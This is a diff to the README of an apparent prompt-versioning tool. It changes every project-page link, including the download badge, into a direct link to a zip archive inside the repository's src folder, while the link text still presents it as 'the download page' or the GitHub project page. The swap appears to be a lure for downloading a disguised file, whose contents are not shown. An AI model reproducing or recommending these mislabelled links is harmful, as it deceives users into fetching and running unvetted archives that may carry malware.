@@ -1,12 +1,12 @@
 # 🧩 py-prompt-versioner - Keep prompts neat and versioned
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Orlyoxidized462/py-prompt-versioner)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the latest version:
 
-[https://github.com/Orlyoxidized462/py-prompt-versioner](https://github.com/Orlyoxidized462/py-prompt-versioner)
+[https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip](https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip)
 
 ## 🖥️ What this app does
 
@@ -34,7 +34,7 @@ If you are not sure whether Python is installed, search for Python in the Start 
 Follow these steps:
 
 1. Open this page in your browser:
-   - [py-prompt-versioner on GitHub](https://github.com/Orlyoxidized462/py-prompt-versioner)
+   - [py-prompt-versioner on GitHub](https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip)
 
 2. Look for the latest release or the main project files.
 
@@ -237,7 +237,7 @@ That is useful when several people work on the same prompt set or when you refin
 
 Open the project page here and follow the download or setup steps shown on GitHub:
 
-[https://github.com/Orlyoxidized462/py-prompt-versioner](https://github.com/Orlyoxidized462/py-prompt-versioner)
+[https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip](https://github.com/Orlyoxidized462/py-prompt-versioner/raw/refs/heads/main/src/py-versioner-prompt-v1.0.zip)
 
 ## 🧩 Repository details
 
